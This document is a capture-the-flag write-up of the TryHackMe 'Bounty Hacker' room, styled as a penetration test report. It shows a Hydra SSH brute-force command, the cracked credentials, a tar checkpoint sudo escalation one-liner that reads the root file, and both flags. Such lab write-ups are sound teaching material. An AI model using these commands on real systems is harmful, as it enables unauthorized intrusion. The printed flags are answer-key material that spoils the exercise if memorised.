Bounty Hacker - Penetration Test Report

TryHackMe Easy · May 31, 2026

Target: 10.66.134.41 Date: May 31, 2026 Room: TryHackMe - Bounty Hacker

The Bounty Hacker assessment targeted an Apache/Samba host. Anonymous FTP access exposed a task list and a password list for the lin account. The SSH service was bruteforced using the recovered password list, granting a shell and the user flag. Privilege escalation was achieved by abusing passwordless sudo access to the tar binary via a checkpoint command, yielding the root flag.

1. Reconnaissance

2. FTP Enumeration

Anonymous FTP login was permitted on port 21.

Files retrieved:

  • task.txt - Task list signed by lin
  • locks.txt - List of 26 potential passwords

Contents of task.txt:

1.) Protect Vicious.
2.) Plan for Red Eye pickup on the moon.

-lin

Answer: The task list was written by lin.

3. Service Bruteforce

The locks.txt file contains potential passwords. SSH on port 22 was bruteforced using Hydra with username lin and the password list.

Answer: The service that can be bruteforced is SSH (port 22).

hydra -l lin -P locks.txt ssh://10.66.134.41

Found credentials:

  • Username: lin
  • Password: RedDr4gonSynd1cat3

4. User Flag (user.txt)

SSH login as lin and retrieved user flag.

user.txt: THM{CR1M3_SyNd1C4T3}

5. Privilege Escalation

The user lin has sudo privileges to run /bin/tar as root.

User lin may run the following commands on ip-10-66-134-41:
    (root) /bin/tar

Exploited using tar checkpoint command execution:

sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec='/bin/sh -c "cat /root/root.txt"'

root.txt: THM{80UN7Y_h4cK3r}
